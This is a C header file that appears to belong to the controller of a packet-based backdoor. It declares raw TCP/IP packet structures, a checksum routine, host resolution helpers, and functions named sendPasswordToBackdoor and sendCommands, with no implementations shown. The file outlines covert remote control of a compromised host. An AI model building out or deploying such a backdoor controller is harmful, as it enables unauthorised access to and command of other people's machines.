#ifndef CONTROLLER_H
#define CONTROLLER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h> 	// TCP Header definitions
#include <netinet/udp.h>   	// UDP Header definitions
#include <netinet/ip.h>    	// IP Header definitions
#include <sys/types.h>
#include <unistd.h>
#include <netinet/if_ether.h> 
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <errno.h>
#include "helperFunctions.h"

#define PKT_SIZE		8192

typedef struct 
{
    int RawSocket;
    char *DstHost;
    char *SrcHost;
    int dport;
    int sport;
}AddrInfo;

typedef struct    //needed for checksum calculation - see notes
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
}pseudo_header;

void sendPasswordToBackdoor(void *addr_ptr, char* command);
int sendCommands(int sourcePort, char* command);
unsigned int host_convert(char *);
unsigned short in_cksum(unsigned short *, int);
char * resolve_host (const char *);
char * GetIPAddress (void);
void usage (char **argv);


#endif
